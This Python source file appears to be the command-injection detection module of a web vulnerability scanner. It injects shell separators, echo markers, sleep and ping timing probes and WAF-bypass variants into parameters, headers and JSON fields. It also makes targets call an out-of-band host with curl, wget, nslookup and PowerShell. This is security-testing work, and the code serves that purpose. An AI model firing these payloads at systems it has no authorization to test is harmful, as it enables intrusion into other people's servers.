"""Command injection / RCE detection module for Titan Scanner — fully exhausted.

Features:
  1. Multi-OS Command Separators & Syntaxes:
     • POSIX / Linux (; | && || `...` $(...) \n)
     • Windows (& | && || %VAR%)
  2. Zero Parameter Whitelisting: tests all parameters without caps.
  3. HTTP Header Injection: tests high-risk headers for command sinks.
  4. Nested JSON AST Walker: recursively injects into deep API JSON bodies.
  5. Deterministic Nonce Echo Oracle: confirms shell execution via unique tokens.
  6. Multi-OS Blind Timing Oracle: ping -n (Windows), ping -c (POSIX), sleep.
  7. Out-of-Band (Interactsh) Execution: triggers DNS/HTTP callbacks for blind sinks.
"""

from __future__ import annotations

import asyncio
import copy
import json
import random
import string
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer, BlindDetector
from titan.verify.oracles import extract_error_classes, score_signals


_INJECTABLE_HEADERS_RCE: Tuple[str, ...] = (
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Api-Key",
    "Client-IP",
)


class RCEDetector:
    """Production-grade RCE detector with exhaustive OS syntax coverage."""

    # Cross-platform delay probes: both Windows (ping -n) and POSIX (ping -c, sleep)
    DELAY_PAYLOADS = [
        # POSIX
        "; sleep 4",
        "| ping -c 3 127.0.0.1", "&& ping -c 3 127.0.0.1",
        "; ping -c 3 127.0.0.1",
        "`sleep 4`", "$(sleep 4)",
        "; timeout 4", "| timeout 4",
        "; perl -e 'sleep 4'", "| perl -e 'sleep 4'",
        "; ruby -e 'sleep 4'", "| ruby -e 'sleep 4'",
        "; python -c 'import time;time.sleep(4)'", "| python -c 'import time;time.sleep(4)'",
        "; node -e 'require(\"child_process\").exec(\"sleep 4\")'",
        # Windows
        "| ping -n 3 127.0.0.1", "&& ping -n 3 127.0.0.1",
        "; ping -n 3 127.0.0.1",
        "; timeout /t 4", "| timeout /t 4",
        "; powershell -c \"Start-Sleep -s 4\"",
        "; wscript.exe //B //Nologo //E:jscript \"%TEMP%\\sleep.js\"",
    ]

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.blind_detector = BlindDetector(samples=3, confidence=0.95)
        self.interactsh = fingerprint.get("interactsh")

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "rce",
            "param_type": "command",
            "location": "query" if method == "GET" else "body",
        }

        # Build payload pool
        base_payloads = self.payload_smith.get_base_payloads("rce", context_data)
        waf = (
            self.payload_smith.detect_waf({}, "", 0)
            or self.fingerprint.get("waf", "unknown")
        )
        if waf and waf != "unknown":
            base_payloads.extend(
                self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)
            )

        all_payloads = list(dict.fromkeys(base_payloads + list(self.DELAY_PAYLOADS)))

        # ── Engine 1: Query & Form Parameters (all params, no keyword whitelist) ──
        for param_name in list(params.keys()):
            f = await self._test_param(context, target, method, url, param_name, params, all_payloads)
            if f:
                findings.append(f)

        # ── Engine 2: HTTP Header RCE ─────────────────────────────────
        header_findings = await self._scan_headers(context, target, method, url, params, all_payloads)
        findings.extend(header_findings)

        # ── Engine 3: Nested JSON Body RCE ───────────────────────────
        json_findings = await self._scan_json_body(context, target, method, url, params, all_payloads)
        findings.extend(json_findings)

        return findings

    async def _request(self, context, method: str, url: str, params: Dict[str, str], target: str):
        headers = {"Referer": target}
        if method == "GET":
            return await context.request.get(url, params=params, headers=headers, timeout=3000)
        return await context.request.post(url, data=params, headers=headers, timeout=3000)

    # ------------------------------------------------------------------
    # ENGINE 2 — HTTP HEADER RCE
    # ------------------------------------------------------------------

    async def _scan_headers(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        safe_headers: Dict[str, str] = {"Referer": target}

        try:
            if method == "GET":
                r0 = await context.request.get(url, params=params, headers=safe_headers, timeout=3000)
            else:
                r0 = await context.request.post(url, data=params, headers=safe_headers, timeout=3000)
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        marker = "RCE" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        marker_probes = [
            f";echo {marker}", f"&echo {marker}", f"|echo {marker}",
            f"&&echo {marker}", f"`echo {marker}`", f"$(echo {marker})",
            f";echo({marker})", f"|echo({marker})",  # PowerShell-compatible
            f";print({marker})", f"|print({marker})",  # Python/perl-style
            f";printf '%s\\n' {marker}",  # POSIX printf
        ]

        for header_name in _INJECTABLE_HEADERS_RCE:
            for probe in marker_probes:
                try:
                    inject_headers = {**safe_headers, header_name: probe}
                    if method == "GET":
                        resp = await context.request.get(url, params=params, headers=inject_headers, timeout=3000)
                    else:
                        resp = await context.request.post(url, data=params, headers=inject_headers, timeout=3000)
                    body = await resp.text()

                    if marker in body and not extract_error_classes(body):
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, probe)
                        diffs.append(f"rce:header_marker_reflected:{marker}")
                        findings.append(Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=header_name,
                            location="header",
                            payload=probe,
                            attack_type=AttackType.RCE,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.95,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={"injection_location": "http_header"},
                        ))
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 3 — NESTED JSON AST RCE
    # ------------------------------------------------------------------

    async def _scan_json_body(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        payloads: List[str],
    ) -> List[Finding]:
        findings: List[Finding] = []
        if method.upper() == "GET":
            return findings

        body_str = next(iter(params.values()), "") if len(params) == 1 else ""
        if not body_str:
            try:
                body_str = json.dumps(params)
            except Exception:
                return findings

        try:
            tree = json.loads(body_str)
        except (json.JSONDecodeError, TypeError):
            return findings

        leaves = list(self._json_leaves(tree))

        try:
            r0 = await context.request.post(
                url,
                data=json.dumps(tree),
                headers={"Content-Type": "application/json", "Referer": target},
                timeout=3000,
            )
            baseline_body = await r0.text()
            baseline_status = r0.status
        except Exception:
            return findings

        marker = "RCEJSON" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        marker_probes = [f";echo {marker}", f"|echo {marker}", f"`echo {marker}`"]

        for path in leaves:
            for probe in marker_probes:
                try:
                    mutated = copy.deepcopy(tree)
                    self._json_set(mutated, path, probe)
                    resp = await context.request.post(
                        url,
                        data=json.dumps(mutated),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=3000,
                    )
                    body = await resp.text()

                    if marker in body and not extract_error_classes(body):
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, probe)
                        diffs.append(f"rce:json_marker_reflected:{marker}")
                        findings.append(Finding(
                            target=target,
                            url=str(resp.url or url),
                            method="POST",
                            param=".".join(str(p) for p in path),
                            location="json_body",
                            payload=probe,
                            attack_type=AttackType.RCE,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=0.92,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                            metadata={"injection_location": "json_ast", "json_path": path},
                        ))
                        break
                except Exception:
                    continue

        return findings

    def _json_leaves(self, node: Any, path: Optional[list] = None):
        if path is None:
            path = []
        if isinstance(node, dict):
            for k, v in node.items():
                yield from self._json_leaves(v, path + [k])
        elif isinstance(node, list):
            for i, v in enumerate(node):
                yield from self._json_leaves(v, path + [i])
        elif isinstance(node, (str, int, float)):
            yield path

    def _json_set(self, tree: Any, path: list, value: Any) -> None:
        node = tree
        for key in path[:-1]:
            node = node[key]
        node[path[-1]] = value

    # ------------------------------------------------------------------
    # CORE PARAM TEST
    # ------------------------------------------------------------------

    async def _test_param(
        self,
        context,
        target: str,
        method: str,
        url: str,
        param_name: str,
        all_params: Dict[str, str],
        payloads: List[str],
    ) -> Optional[Finding]:
        baseline_body = ""
        baseline_status = None
        baseline_times: List[float] = []

        try:
            for _ in range(3):
                start = time.monotonic()
                r = await self._request(context, method, url, all_params, target)
                baseline_times.append(time.monotonic() - start)
                if not baseline_body:
                    baseline_body = await r.text()
                    baseline_status = r.status
        except Exception:
            pass

        # Reflection oracle: a unique marker echoed back proves command execution.
        marker = "".join(random.choices(string.ascii_letters + string.digits, k=8))
        marker_payloads = [
            f";echo {marker}", f"&echo {marker}", f"|echo {marker}",
            f"&&echo {marker}", f"`echo {marker}`", f"$(echo {marker})",
            f";echo({marker})", f"|echo({marker})",
            f";printf '%s\\n' {marker}",
            f";print({marker})", f"|print({marker})",
        ]

        oob_url = None
        if self.interactsh:
            try:
                oob_url = self.interactsh.generate_oob_url("rce")
            except Exception:
                pass

        all_test_payloads = list(dict.fromkeys(payloads + marker_payloads))
        tested_delay_families: Dict[str, int] = {}

        for payload in all_test_payloads:
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload

                # Check for blind delay capabilities first across distinct OS command families
                delay_family = None
                p_lower = payload.lower()
                if "ping -n" in p_lower:
                    delay_family = "ping_n"
                elif "ping -c" in p_lower:
                    delay_family = "ping_c"
                elif "sleep" in p_lower:
                    delay_family = "sleep"
                elif "timeout" in p_lower:
                    delay_family = "timeout"

                if delay_family and tested_delay_families.get(delay_family, 0) < 2 and sum(tested_delay_families.values()) < 6:
                    tested_delay_families[delay_family] = tested_delay_families.get(delay_family, 0) + 1
                    is_blind, blind_time = await self.blind_detector.detect_time_based(
                        context, url, method, test_params, {}, {"Referer": target},
                        payload, "query" if method == "GET" else "body",
                        baseline_times, param_name=param_name,
                    )
                    if is_blind:
                        diffs = BaselineAnalyzer.diff_responses(baseline_body, "", payload)
                        diffs.append(f"time_delay:{blind_time:.1f}s")
                        confidence, verified, _ = score_signals(["time_delay"])
                        return Finding(
                            target=target,
                            url=url,
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.RCE,
                            severity=Severity.CRITICAL,
                            verified=True,
                            confidence=confidence,
                            status=200,
                            headers={},
                            body="",
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=f"time_delay:{blind_time:.1f}s",
                            verification_status=200,
                        )

                resp = await self._request(context, method, url, test_params, target)
                body = await resp.text()

                signals: List[str] = []
                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)

                # Marker reflection proof: marker output without diagnostic error
                if marker in body and not extract_error_classes(body):
                    signals.append("reflection")
                    diffs.append("rce:marker_reflected")

                # Command-output fingerprints in the body
                rce_content_indicators = [
                    # Unix/Linux command output
                    "uid=", "gid=", "groups=", "root:", "daemon:",
                    "whoami", "hostname", "uname -a", "pwd",
                    "ls -la", "total ", "drwx", "-rw-r--r--",
                    "cat /etc/passwd", "root:x:0:0",
                    # Windows command output
                    "windows ip configuration", "volume serial",
                    "microsoft windows", "copyright (c)",
                    "wmic", "systeminfo", "tasklist", "services.exe",
                    # PHP / server info
                    "phpinfo()", "directory of",
                    "apache", "nginx", "httpd", "server version",
                    # Database command shells
                    "mysql>", "psql>", "sqlite>", "mongodb",
                    # Network / system info
                    "netstat", "ss -", "ifconfig", "ip addr",
                    "route -n", "traceroute", "ping statistics",
                    "process list", "running processes",
                    # Cloud metadata
                    "ami-id", "instance-id", "metadata.google",
                    # Generic shell artifacts
                    "$ ", "# ", "bash", "sh:", "shell",
                    "command not found", "not recognized",
                    "permission denied", "access denied",
                ]
                content_matches = [ind for ind in rce_content_indicators if ind in body.lower() and ind not in baseline_body.lower() and ind not in payload.lower()]
                if content_matches:
                    signals.append("content_leak")
                    for m in content_matches:
                        diffs.append(f"rce:content:{m}")

                # Error classes — only shell eval sinks (generic, python, java, php)
                ALLOWED = {"generic", "python", "java", "php"}
                for error_class in extract_error_classes(body):
                    if error_class in ALLOWED:
                        signals.append(f"error:{error_class}")
                        diffs.append(f"rce:error_class:{error_class}")

                if resp.status >= 500:
                    signals.append("status_500")

                if signals:
                    confidence, verified, _ = score_signals(signals)
                    if confidence >= 0.3:
                        severity = Severity.CRITICAL if verified else Severity.HIGH
                        return Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload,
                            attack_type=AttackType.RCE,
                            severity=severity,
                            verified=verified,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
            except Exception:
                continue

        # OOB phase
        if oob_url and self.interactsh:
            try:
                await self.interactsh.register()
                oob_host = urlparse(oob_url).netloc
                oob_payloads = [
                    f";ping {oob_host}", f"|ping {oob_host}", f"`ping {oob_host}`",
                    f";curl {oob_url}", f"|curl {oob_url}",
                    f";wget -qO- {oob_url}", f"|wget -qO- {oob_url}",
                    f";python -c \"import urllib.request;urllib.request.urlopen('{oob_url}')\"",
                    f";powershell -c \"Invoke-WebRequest -Uri {oob_url}\"",
                    f";nslookup {oob_host}", f"|nslookup {oob_host}",
                ]
                for oob_payload in oob_payloads:
                    try:
                        test_params = dict(all_params)
                        test_params[param_name] = oob_payload
                        await self._request(context, method, url, test_params, target)
                    except Exception:
                        continue
                await asyncio.sleep(2)
                oob_results = await self.interactsh.poll(timeout=10)
                if oob_results:
                    return Finding(
                        target=target,
                        url=url,
                        method=method.upper(),
                        param=param_name,
                        location="query" if method == "GET" else "body",
                        payload=f"OOB RCE: {oob_url}",
                        attack_type=AttackType.RCE,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.95,
                        status=200,
                        headers={},
                        body="",
                        diffs=["rce:oob_confirmed"],
                        baseline_body=baseline_body[:2000],
                        baseline_status=baseline_status,
                        verification_body="OOB interaction confirmed",
                        verification_status=200,
                    )
            except Exception:
                pass

        return None



